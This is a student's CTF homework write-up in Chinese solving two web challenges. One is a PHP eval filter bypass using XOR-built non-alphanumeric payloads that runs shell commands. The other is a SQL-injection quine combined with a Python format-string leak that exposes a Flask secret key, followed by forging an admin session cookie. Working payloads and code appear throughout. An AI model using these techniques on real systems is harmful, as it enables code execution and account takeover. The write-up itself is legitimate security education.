# HW5 writeup

## (#°д°)
### Solution
本題希望我們輸入一個 PHP payload ，然後丟給 eval 函式執行。不過 payload 有長度上的限制 (長度 < 32) 以及不能含有 alphanumeric 以及 backtick。

PHP 有一個很奇怪的特性，那就是字串可以拿來 call 函數。例如 `'system'('ls')` 。因此我們可以利用這個特性構造 payload。既然不能有 alphanumeric 字元，我們試著將我們想要用的字串 s1 先 xor 一個 non-alphanumeric 的字串 s2，得到 s3。而後如果 s3 也是 non-alphanumeric 的話，`s2^s3` 也一樣會是  non-alphanumeric ，同時 `s2^s3` 的值等同於 s1。這裏，我令 s2 爲 `str_repeat("\x80", strlen($s1))`，這樣可以百分百保證 s3 有會是 non-alphanumeric 的。原理很直觀，就是把 MSB 翻成 1 而已。

最後，因為本題有長度限制，所以我希望 payload 越小越好。因此我用到的 PHP 的令一個特性：當 PHP 遇見 unquoted string literal 時，它會幫你自動轉成 string ，加上噴一些 warning (可以忽略沒差)。因此，`'ls'^'\x80\x80'` 可以簡化成 `ls^\x80\x80`。

於是，依據以上的分析，我寫了一個 PHP script 幫我們自動產生 payload（程式碼在 `payload.php` 中，用法是 `php payload.php <command>`）。

之後，根據經驗先看看根目錄有沒有 flag：
```
php payload.php "ls /"
https://php.splitline.tw/?(%23°д°)=%28%80%80%80%80%80%80%5E%F3%F9%F3%F4%E5%ED%29%28%80%80%80%80%5E%EC%F3%A0%AF%29%3B
```
結果：
![](https://i.imgur.com/LZwzls6.png)

看到 flag 了！把 flag 印出來：

```
php payload.php "cat /*"
https://php.splitline.tw/?(%23°д°)=%28%80%80%80%80%80%80%5E%F3%F9%F3%F4%E5%ED%29%28%80%80%80%80%80%80%5E%E3%E1%F4%A0%AF%AA%29%3B
```
結果：
![](https://i.imgur.com/jOIAJIP.png)

更新：自動化腳本在 `(#°д°).php` 可以看到。用法是 `php \(\#°д°\).php`

## VISUAL BASIC 2077

根據本題的敘述，本題希望我們在 login panel 做 SQL injection。先看看 SQL 部分的 source code：

```python
query = f"select username, password from users where username='{username}' and password='{password}'"
```
`username` 和 `password` 都是可控的，因此這裏很明顯有 SQL injection 的漏洞。

原先的方法是用 time based 的 SQL injection 把帳密爆出來，不過爆出來後沒有什麼用。我們 trace 一下 code 就知道為什麼：
```python
if res != None and res['username'] == username and res['password'] == password:
    return ("<h1>Hello, " + username + " ｡:.ﾟヽ(*´∀`)ﾉﾟ.:｡ </h1> Here is your flag: {flag} ").format(flag=flag)
```
這邊我們可以看到 flag 是從以下的 code 產生的：
```python3
def __str__(self):
    return self.flag if session.get('is_admin', False) else "Oops, You're not admin (・へ・)"    
```
也就是說，`session['is_admin']` 必須是 true 才會噴 flag 回來。可惜的是，這份程式碼沒有任何地方能讓我的 `session['is_admin']` 變 true。 

不過，因爲本題的後端是用 Flask 寫的，flask 的 session 其實是放在 client 端的。詳細地來說，Flask 的 session 分成三個部分： base64 encode 的 session data，base64 encode 的時間戳，以及 base64 encode 的簽章。於是，base64 decode 第一個部分就會發現 session data 了：
```
{"is_admin":false}
```
由此可知，構造session 並不是件難事，重點是簽章的部分。
根據官方文件，簽章用的 key 是 `flask.Flask.secret_key`。可惜的是在程式的第七行可以看到：

```python
app.secret_key = urandom(32)
```
這個 secret 理想上是爆破不出來的。

那要怎麼辦呢？繼續用力 trace 一下 source code ，我發現一個詭異的地方：
```python
return ("<h1>Hello, " + username + " ｡:.ﾟヽ(*´∀`)ﾉﾟ.:｡ </h1> Here is your flag: {flag} ").format(flag=flag)
```
乍看之下好像很正常，但因為 username 是可控的，因此有 python 版的 format string 漏洞。例如可以設想當 `username = '{flag.__init__}'` 時，本行會變成 
```python
"<h1>Hello, {flag.__init__} ｡:.ﾟヽ(*´∀`)ﾉﾟ.:｡ </h1> Here is your flag: {flag} "
```
，執行完後理想上會印出 `flag.__init__` 的值。計劃上，我們可以 somehow 利用在 SSTI 學到的技巧去把我們想要的一些資訊挖出來。不過，前提是我們必須繞過
```python
res['username'] == username and res['password'] == password
```
。換言之，如果我們對 username 做 injection ，我們的 injection code 必須要和 username 一模一樣。

一開始試想 exploit sqlite3 的 execute 看看能不能做注入。不過也沒辦法了。可惜的是這函數似乎沒辦法用 `;` 去執行多於一個 command ，所以沒辦法 `INSERT INTO users ...` 之類的方法去插入新的 username & password。最後，我去問了助教解題方向後才恍然大悟。

splitline 大大告訴我解題的關鍵在於 hint：

```python
_='_=%r;return (_%%_)';return (_%_)
```

仔細觀賞這行 code，我們可以看到這行程式的輸出和程式碼一模一樣！！爬了許多文後發現這種程式的輸出和程式碼一樣的程式叫做 quine。似乎是一群<del>閒著沒事的人</del>喜歡研究的程式藝術。(我太菜了Orz)

那 quine 對我們的解題有何幫助呢？我們剛剛說過如果我們對 username 做 injection ，injection code 必須要和 username 一樣。也就是說，我們可以 somehow 構造 SQL 版本的 quine 去繞過這項限制。

又爬了許多文後發現有一位叫  [MakeNowJust](https://github.com/MakeNowJust/quine) 的 quine 大佬寫的 quine.sql ：
```sql
select printf(s,s)from(select'select printf(s,s)from(select%Qas s);'as s);
```

總之，拿這位大佬的 SQL code 去改。經過許多 trial and error 後終於構造出 paload 來了（ 麻煩的原因是 sqlite 沒有 default 的跳脫字元，必須利用 `substr(quote(hex(0)),1,1)` 之類的旁門左道去產出 `'` ）：
```sql
' UNION SELECT "{flag.__init__}",printf(substr(quote(hex(0)),1,1)||a,a) FROM (SELECT ' UNION SELECT "{flag.__init__}",printf(substr(quote(hex(0)),1,1)||a,a) FROM (SELECT %Q AS a)--' AS a)--
```

丟看看結果：
![](https://i.imgur.com/cpUuEKg.png)

要看一下 source 才會有東西:

```htmlembedded
<h1>Hello, <bound method Flag.__init__ of <main.Flag object at 0x7fd5b8cb5b80>> ｡:.ﾟヽ(*´∀`)ﾉﾟ.:｡ </h1> Here is your flag: Oops, You're not admin (・へ・) 
```

成功！

再來，我們要挖什麼資訊呢？我們剛說 `app.secret_key` 實做上是爆破不出來的，那我們或許可以利用 SSTI 的相關技巧撈出這把 key。比較可惜的是這種 format string 不支援 function call 的。所以 `flag.__class__.__mro__.__subclasses__()` 之類的方法不能用。另一種常用的技巧是用 `__init__.__globals__` 去抓 global variable。由於 `app` 很明顯是 global 的，因此 `flag.__init__.__globals__[app].secret_key` 理論上是找的到的。用這個方法的好處是不需要用到 function call。

試看看以下的 payload:

```sql
' UNION SELECT "{flag.__init__.__globals__[app].secret_key}",printf(substr(quote(hex(0)),1,1)||a,a) FROM (SELECT ' UNION SELECT "{flag.__init__.__globals__[app].secret_key}",printf(substr(quote(hex(0)),1,1)||a,a) FROM (SELECT %Q AS a)--' AS a)--
```

結果：

![](https://i.imgur.com/QrGo8vw.png)

secret key 被我找到了！

剩下的工作就是僞造 session 了。我們可以利用 `flask_unsign`  這個 module 將`{"is_admin":true}` 覆蓋入 session。以下是僞造 session 的程式碼：

```python
import flask_unsign
secret_key = b'\xc5\xee\x1e\xb6n\x13\x95\x184^\xb2\x1cA\xa7\x11E\xa2B\x8d\x00\xfd\xa6\xc6Z4\x86\xa5\xb1_\xff\x15\xd1'
text = {"is_admin": True}
new_session = flask_unsign.sign(text, secret_key)
print(new_session)
```

把舊的 cookie 換上僞造的新 cookie 後就得到 flag 了！

![](https://i.imgur.com/UKGh9lK.png)

自動化腳本在 `quine.py` 可以找到。用法是 `python3 quine.py`。
